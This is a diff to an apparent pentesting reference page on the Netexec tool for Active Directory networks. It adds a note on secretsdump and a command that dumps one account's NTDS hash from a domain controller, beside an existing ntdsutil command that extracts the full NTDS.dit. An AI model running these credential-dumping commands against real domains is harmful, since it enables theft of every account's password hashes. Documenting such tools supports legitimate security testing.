@@ -5,7 +5,7 @@ title = "Netexec"
 - https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol
 - Logs: `~/.nxc/logs/`
 
-Netexec (formerly CrackMapExec) is a swiss army knife for pentesting networks that helps automate assessing the security of large networks in AD environments
+Netexec (formerly CrackMapExec) is a swiss army knife for pentesting networks that helps automate assessing the security of large networks in AD environments. Netexec uses `secretsdump` libraries under its hood, so it is the preferred tool for network enumeration (though `secretsdump` is still great for offline hash extraction or targeted actions).
 
 ## Password Policy Enumeration
 
@@ -119,6 +119,13 @@ Extract the NTDS.dit file (keys of the kingdom) from a domain controller:
 ```bash
 # Extract NTDS.dit using ntdsutil module
 nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
+```
+
+To dump **one** account instead of the full database (like `secretsdump`), add `--user` to `--ntds` (less noise when you only need a specific principal):
+
+```bash
+# Dump a specific user only (NTDS hash extraction scoped to one account)
+nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user Administrator
 ```
 
 ## LDAP Operations
